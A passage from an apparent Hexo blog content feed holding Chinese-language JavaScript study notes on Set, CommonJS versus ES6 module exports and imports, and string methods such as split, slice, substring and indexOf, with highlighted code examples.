function_">log</span>(array.<span class="property">length</span>);</span><br><span class="line">    <span class="comment">// 声明一个set集合 不可以储存重复的值</span></span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>(list);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="property">size</span>);</span><br><span class="line">    <span class="comment">// 判断元素是否存在</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="string">&#x27;索隆&#x27;</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="string">&#x27;娜美&#x27;</span>));</span><br><span class="line">    <span class="comment">// 添加元素</span></span><br><span class="line">    set.<span class="title function_">add</span>(<span class="string">&#x27;山治&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set);</span><br><span class="line">    <span class="comment">// 不会添加重复元素</span></span><br><span class="line">    set.<span class="title function_">add</span>(<span class="string">&#x27;路飞&#x27;</span>);</span><br><span class="line">    set.<span class="title function_">add</span>(<span class="string">&#x27;索隆&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(set);</span><br><span class="line">    <span class="comment">// 遍历set</span></span><br><span class="line">    set.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(element);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> it <span class="keyword">of</span> set) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(it);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>commonJs与Es6Module</title>
      <link href="/posts/commonjs-yu-es6module/"/>
      <url>/posts/commonjs-yu-es6module/</url>
      
        <content type="html"><![CDATA[<h2 id="一、commonJs模块化规范"><a href="#一、commonJs模块化规范" class="headerlink" title="一、commonJs模块化规范"></a>一、commonJs模块化规范</h2><p>【1.js文件直接输出结果；2.须在node 环境使用，html不认识require，报错Uncaught ReferenceError: require is not defined】<br>目录结构：</p><div class="tip cogs"><p>–index.js【入口js，该js文件使用“require 关键字”引入 小模块nodeOut.js】<br>–nodeOut.js【小模块，该js文件使用“exports 关键字”暴露 数据】</p></div><p>》》nodeOut.js 暴露 数据：<br>注意：（若引入的是没有 通过exports暴露的 模块（js文件），会得到一个空对象 {} ）<br>1.被引入模块的（js文件,例如nodeOut.js）中，通过exports暴露的是 至少包含一个 键值对 的 对象；被引入模块的（json文件）中，通过exports暴露的是“json文件中的内容”。<br>将要引入 模块的（js文件）中，通过require(‘.js’)引入的是 至少包含一个 键值对 的 对象。<br>示例：暴露（一个数据） </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">address</span> = <span class="string">&#x27;郑州&#x27;</span>，</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> address = <span class="string">&#x27;郑州&#x27;</span>;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">address</span> = address;<span class="comment">//暴露出 只包含一个键值对 的对象 &#123;address:&quot;郑州&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>两种方式都一样，通过require(‘.&#x2F;nodeOut.js’)引入，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./nodeOut.js&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">// &#123;address:&quot;郑州&quot;&#125;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>示例：暴露（多个数据）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> names = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;退出&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">方式<span class="number">1</span>：(直接导出 <span class="number">1</span>个对象！其中 每个键值对的 键、值 名相同，可简写一个名字)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">names</span>:names, logout</span><br><span class="line">&#125;</span><br><span class="line">方式<span class="number">2</span>：</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">names</span> = names;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>暴露方式<span class="number">1</span>：<span class="built_in">exports</span>.<span class="property">logout</span> = logout;</span><br><span class="line">或者 不在上面声明 具名函数，而直接 暴露 出：【如下方式 单独暴露 函数，导出的是 匿名 函数体（两种暴露<span class="keyword">function</span>方式最终的“引用的传递”效果相同）】</span><br><span class="line"><span class="keyword">function</span>暴露方式<span class="number">2</span>：<span class="built_in">exports</span>.<span class="property">logout</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;退出&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>》》index.js 引入数据：<br>let a &#x3D; require(‘.&#x2F;nodeOut.js’);<br>console.log(a);<br>通过function暴露方式1 输出： { names: ‘张三’, logout: [Function:logout] }，<br>通过function暴露方式2 输出： { names: ‘张三’, logout: [Function] }<br>a.logout();&#x2F;&#x2F; 退出</p><div class="tip sync"><p>【重点总结：无论是 方式1、方式2 哪种暴露方式，最终导出的本质都是一个对象，可以通过该对象的“属性”来访问暴露的功能。】<br>【补充：json文件只有 2种 数据格式：”string”，，，，[{“string”}] 或 [{“string”:”string”}]】</p></div><p>3.引入模块时，通过require(‘.&#x2F;a’)，可省略 拓展名，具体有3种情况：<br>将要引入 模块的 index.js文件 所在目录中，<br>若同时有a.js、a.json、(文件夹)a&#x2F;index.js，通过require(‘.&#x2F;a’)引入的 默认是 a.js；<br>目录结构：</p><div class="tip cogs"><p>–a&#x2F;index.js<br>–a.json<br>–a.js<br>–index.js</p><p>若同时有a.json、(文件夹)a&#x2F;index.js，没有a.js，则通过require(‘.&#x2F;a’)引入的 默认是 a.json；<br>目录结构：<br>–a&#x2F;index.js<br>–a.json<br>–index.js</p><p>若只有 (文件夹)a&#x2F;index.js，则通过require(‘.&#x2F;a’)引入的 默认是 同目录a文件夹下的 index.js；<br>目录结构：<br>–a&#x2F;index.js<br>–index.js</p></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./a&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br></pre></td></tr></table></figure><h2 id="二、es6提出的ESmodule模块化规范"><a href="#二、es6提出的ESmodule模块化规范" class="headerlink" title="二、es6提出的ESmodule模块化规范"></a>二、es6提出的ESmodule模块化规范</h2><p>【1.html通过<code>&lt;script src:&quot;js文件&quot; type:&quot;module&quot;&gt;&lt;/script&gt;</code>引入js文件后，html页面输出结果；2.浏览器客户端中使用】</p><div class="tip sync"><p>【补充：<br>—同源策略：页面之间的数据传输的基础是同源（协议、域名、端口号 都相同），否则会出现“跨域”错误;<br>—不同于 commonJs中的require(‘a’)，函数import(‘.js’)中的“拓展名”，不能省略！只能import(‘a.js’)<br>—不同于 commonJs中的 exports.key名 &#x3D; value值、module.exports &#x3D; {key:value}，前面暴露的必须是个对象a（let a &#x3D; require(‘a’)引入后，可直接通过“a.属性名”访问）；</p></div><ol><li>ESmodule中”命名导出”方式，（即export let 变量名、或 export{ 变量名1，函数名1} ）暴露的也都是一个对象。<br>注意：<br>暴露出的 变量名、函数名 或类名 作为该对象的“属性名”（都要在import处必须使用 {}“解构”要导入的“同名属性”，如import {name,fn} from ‘.&#x2F;toolA.js’导入，之后fn函数可直接”fn()”调用。）。 </li><li>通过export default暴露的内容可以是一个对象、函数、类、基本数据类型等任何合法的JavaScript表达式，并不一定是一个对象。它们可以直接通过import语句“自定义模块名”导入，而无需使用 {} 解构。<br>】<br>目录结构：</li></ol><div class="tip cogs"><p>–index.html【主页面，该文件以<code>&lt;script src=&quot;./main.js&quot; type=&quot;module&quot;&gt;&lt;/script&gt;</code>方式引入， 并执行main.js。[script标签可以跨域请求资源]】<br>–main.js【入口js，该js文件使用“import {变量名} from ‘路径’ ”引入 大模块tool.js】<br>–tool&#x2F;tool.js【大模块，该js文件使用“export 关键字”暴露 数据】<br>–tool&#x2F;toolA.js【tool.js中的 小模块toolA.js，该js文件使用“export 关键字”暴露 数据】<br>–tool&#x2F;toolB.js【tool.js中的 小模块toolB.js，该js文件使用“export 关键字”暴露 数据】</p></div><p>》》小模块toolA.js 暴露数据：<br>【“命名导出”允许为模块中的多个功能分别指定导出名称。一个模块可以有多个命名导出。使用命名导出后，在引入该模块时，要使用 {} 解构，且只能使用原名称，可直接“原方法名()”调用。即必须import {name,fn} from ‘.&#x2F;toolA.js’导入，fn函数可直接”fn()”调用。】<br>“命名导出”方式1（即将”声明”直接通过”export关键字”导出。也可理解为将 变量名(或函数名)分别 导出）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> name = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这里是 toolA.js&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>“命名导出”方式2（等同于 方式1，即先”声明”，再通过”export关键字”将”对象字面量{name,fn}”导出。也可理解为将需要暴露的 变量名(或函数名) 都放入 export{ } 中一起 导出）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这里是 toolA.js&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span>&#123;</span><br><span class="line">    name,fn    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方式3，<br>【“default默认导出”允许将一个模块中的主要功能（通常是一个函数、类或对象）标记为默认导出；<br>一个模块只能有一个默认导出；<br>export default 后面应该跟着一个表达式（如函数的赋值表达式）或值。不能跟函数定义（函数体）<br>默认导出的好处在于，在导入时可以使用任何名称，导入时不需要通过 {}解构。】<br>可将 需要暴露的数据放入 obj 对象中，default 暴露obj。那么，在 大模块tool.js中 则不需要 import {变量名1，函数名1…} 引入，而是直接 import  某对象名（任意名称） 引入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这里是 toolA.js&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>: name,</span><br><span class="line">    <span class="attr">fn</span>: fn</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> obj;<span class="comment">// 【默认导出obj对象，注意有 default 关键字。另外，default对象形式 导出，在另一个js文件中 要以import “任意对象名” 接收。通过“任意对象名.方法名”使用。】</span></span><br></pre></td></tr></table></figure><div class="tip sync"><p>【补充：<br>export default getAvatar &#x3D; () &#x3D;&gt; console.log(‘111’)；<br>导出时使用“默认导出”，导入时可以使用任意的名称，不需要{}解构。如import fnn from ‘.&#x2F;<em>.js’后，直接fnn(); &#x2F;&#x2F;111<br>export const getAvatar &#x3D; () &#x3D;&gt; console.log(‘111’)；<br>导出时使用“命名导出”，导入时需要使用与导出名称相匹配名称，且要加上 {} 解构。如import {getAvatar} from ‘.&#x2F;</em>.js’后，getAvatar(); &#x2F;&#x2F;111<br>】</p></div><p>这样做对 后续演示 影响较大，这里直接展示 大模块tool.js更改后的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> obj <span class="keyword">from</span> <span class="string">&#x27;./toolA.js&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj);<span class="comment">// &#123;name: &#x27;张三&#x27;,  fn: ƒ&#125;</span></span><br><span class="line">obj.<span class="title function_">fn</span>();<span class="comment">// &quot;这里是 toolA.js&quot;</span></span><br></pre></td></tr></table></figure><p>》》小模块toolB.js 暴露数据（方式 同理toolA.js）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">gn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这里是 toolB.js&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> age= <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>》》大模块tool.js 引入、暴露数据：<br>方式1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入【注意：&#123;&#125;中是 变量名(或函数名) 的 集合，整体 非对象】</span></span><br><span class="line"><span class="keyword">import</span> &#123;fn,name&#125; <span class="keyword">from</span> <span class="string">&#x27;./toolA.js&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;gn,age&#125; <span class="keyword">from</span> <span class="string">&#x27;./toolB.js&#x27;</span></span><br><span class="line"><span class="comment">// 导出【注意：&#123;&#125;中是 变量名(或函数名) 的 集合，整体 可理解为一个对象】</span></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    fn,name,gn,age</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可简写为，方式2（引入 每个 小模块 暴露出的所有数据、并直接 暴露，tool.js作用是数据中转。）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./toolA.js&#x27;</span></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./toolB.js&#x27;</span></span><br></pre></td></tr></table></figure><p>》》入口文件main.js 引入数据：<br>方式1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;name ,age , fn, gn&#125; <span class="keyword">from</span> <span class="string">&#x27;./tools/tool.js&#x27;</span>;<span class="comment">//导入的变量名不能更改！必须与 大模块tool.js暴露出的 变量名(或函数名) 对应。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);<span class="comment">// 张三</span></span><br><span class="line"><span class="title function_">fn</span>();<span class="comment">// &quot;这里是 toolA.js&quot;</span></span><br></pre></td></tr></table></figure><p>这里可为 “大模块tool.js暴露出的变量名(或函数名)” 取 别名a,b,f,g，在main中直接使用 别名（之后该别名 默认为 常量，不能被重新赋值）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;name <span class="keyword">as</span> a,age <span class="keyword">as</span> b,fn <span class="keyword">as</span> f,,gn <span class="keyword">as</span> g&#125; <span class="keyword">from</span> <span class="string">&#x27;./tools/tool.js&#x27;</span></span><br><span class="line"><span class="comment">// a = &#x27;zhang&#x27;;  // 别名a是常量，不能被赋值！</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">// 张三</span></span><br></pre></td></tr></table></figure><p>【注意：通过 “import {变量名} from ‘路径’ ”引入，该语句只能写在 js文件 最上面，而不能 写在 执行语句 中。如若要按需引入，可以通过 变量 接收 import()的返回值（它是个promise对象）】<br>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需求：当你flag是true的时候 导入a.js  当你flag是false的时候 导入b.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">var</span> res;</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        <span class="comment">// import &#x27;obj1&#x27; from &#x27;./a.js&#x27;; // 导入语句只能写在最上面 </span></span><br><span class="line">        res = <span class="keyword">import</span>(<span class="string">&#x27;./a.js&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">// import()函数 导入的是一个promise对象</span></span><br><span class="line">        res.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="property">default</span>);<span class="comment">// 当a.js中数据暴露方式 是export default obj时，value会添加一个default属性，其值是obj</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(value);<span class="comment">// 当a.js中数据暴露方式 不是export default obj时，a.js暴露出几个变量(或函数) ，value就会添加几个属性，属性名 与a.js暴露的 变量名(或函数名) 一致。</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串与数组</title>
      <link href="/posts/zi-fu-chuan-yu-shu-zu/"/>
      <url>/posts/zi-fu-chuan-yu-shu-zu/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、字符串操作"><a href="#一、字符串操作" class="headerlink" title="一、字符串操作"></a>一、字符串操作</h2><h3 id="切割、合并、截取"><a href="#切割、合并、截取" class="headerlink" title="切割、合并、截取"></a>切割、合并、截取</h3><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>函数：String.split(separator, ?limit)</p><p>功能：使用一个指定的分隔符把一个字符串分割存储到数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;jpg|bmp|gif|ico|png&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = str.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>); <span class="comment">// [jpg, bmp, gif, ico, png]</span></span><br><span class="line"><span class="keyword">let</span> arr = str.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>, <span class="number">2</span>); <span class="comment">// [jpg, bmp] - 第二个参数用来限制数组大小</span></span><br></pre></td></tr></table></figure><h4 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h4><p>函数：String.concat(…strings)</p><p>功能：将多个字符串依次并在String的后面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;start&#x27;</span>.<span class="title function_">concat</span>(<span class="string">&#x27;, &#x27;</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27; world&#x27;</span>) <span class="comment">// start, hello world</span></span><br></pre></td></tr></table></figure><h4 id="slice、substring、substr比较"><a href="#slice、substring、substr比较" class="headerlink" title="slice、substring、substr比较"></a>slice、substring、substr比较</h4><h5 id="函数：String-slice-start-end"><a href="#函数：String-slice-start-end" class="headerlink" title="函数：String.slice(start, ?end)"></a>函数：String.slice(start, ?end)</h5><p>start：必填。指定子字符串开始位置，默认为0。可以为负数，-1表示最后一位，-2表示倒数第二位。<br>end：可选。指定子字符串结束位置，可以为负数。如果未指定此参数，则表示从start到字符串结束的子字符串。<br>return：返回子字符串，包含从start到end-1的所有字符，长度 为“end减start”，即“包前 不包后”！</p><h5 id="函数：String-substring-start-end"><a href="#函数：String-substring-start-end" class="headerlink" title="函数：String.substring( start, ?end)"></a>函数：String.substring( start, ?end)</h5><p>start：必填。非负整数，指定子字符串开始位置。如果start为负数，自动替换为0<br>end：可选。非负整数，指定子字符串结束位置。如果end为负数，自动替换为0<br>return：返回子字符串，包含从start到end-1的所有字符，长度 为“end减start”，即“包前 不包后”！<br>如果start比end大，那么会先交换两个参数再截取字符串</p><h5 id="函数：String-substr-from-length"><a href="#函数：String-substr-from-length" class="headerlink" title="函数：String.substr( from, ?length)"></a>函数：String.substr( from, ?length)</h5><p>from：必填。指定子字符串开始位置。可以为负数，-1表示最后一位，-2表示倒数第二位。<br>length：可选。待选取字符串的长度。0或负数返回空字符串，不指定，则子字符串延续到字符串的最后。<br>return：返回子字符串，包含从start起，截取的length长度的字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>() <span class="comment">// 012345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>() <span class="comment">// 012345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>() <span class="comment">// 012345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>(<span class="number">1</span>) <span class="comment">// 12345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>(<span class="number">1</span>) <span class="comment">// 12345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>(<span class="number">1</span>) <span class="comment">// 12345</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>(-<span class="number">2</span>) <span class="comment">// 45</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>(-<span class="number">2</span>) <span class="comment">// 012345| * 负数替换为0，变成substring(0)</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>(-<span class="number">2</span>) <span class="comment">// 45</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="comment">// 12| *  位置1到3-1的字符串</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="comment">// 12| * 位置1到3-1的字符串</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="comment">// 123| * 从1起长度为3的字符串</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>(<span class="number">3</span>, <span class="number">1</span>) <span class="comment">// &#x27;&#x27;| * 从位置3到1，截取不到字符</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>(<span class="number">3</span>, <span class="number">1</span>) <span class="comment">// 12| * start,end互换，变成substring(1，3)</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>(<span class="number">3</span>, <span class="number">1</span>) <span class="comment">// 3| * 从位置3起截取，长度为1</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">slice</span>(-<span class="number">3</span>, -<span class="number">1</span>) <span class="comment">// 34| * 倒数第3位到（倒数第1位-1）的字符串</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substring</span>(-<span class="number">3</span>, -<span class="number">1</span>) <span class="comment">// &#x27;&#x27;| * 负数替换为0，变成substring(0, 0)</span></span><br><span class="line"><span class="string">&#x27;012345&#x27;</span>.<span class="title function_">substr</span>(-<span class="number">3</span>, -<span class="number">1</span>) <span class="comment">// &#x27;&#x27;| * length为负数，没有长度，返回空字符串</span></span><br></pre></td></tr></table></figure><h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><ol><li>slice, substring根据位置截取字符串；substr根据长度截取。</li><li>substring的start&#x2F;end的有效值为非负整数，slice的start&#x2F;end, substr的from可以为负数。</li><li>第二个参数不提供（end, length)，则截取到字符串末尾。</li><li>只有substring会 根据大小自动调整start, end的先后，以截取到有效字符串。</li></ol><h3 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h3><h4 id="indexOf、lastIndexOf"><a href="#indexOf、lastIndexOf" class="headerlink" title="indexOf、lastIndexOf"></a>indexOf、lastIndexOf</h4><p>函数：String.indexOf(searchString, ?position), String.lastIndexOf(searchString, ?position)</p><p>功能：indexOf从字符串开始位置向后 查找指定字符串的位置，lastIndexOf相反，从字符串尾部向前查找</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;o&#x27;</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;llo&#x27;</span>)<span class="comment">//2  返回&#x27;llo&#x27;子串 首字母 的索引</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;o&#x27;</span>, <span class="number">5</span>) <span class="comment">// 7| * 从空格处(index=5)开始向后查找</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;o&#x27;</span>, <span class="number">7</span>) <span class="comment">// 7</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;o&#x27;</span>, <span class="number">5</span>) <span class="comment">// 4| * 从空格处(index=5)开始向前查找</span></span><br></pre></td></tr></table></figure><h4 id="charAt"><a href="#charAt" class="headerlink" title="charAt"></a>charAt</h4><p>函数：String.charAt(index)</p><p>功能：返回指定位置的字符。字符串中第一个字符的下标是0。如果参数 index 不在 0 与 string.length 之间，该方法将返回一个空字符串’’若通过String[索引]方式查找不到 目标字符，返回的是undefined</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;0123456&#x27;</span>.<span class="title function_">charAt</span>(<span class="number">4</span>) <span class="comment">// 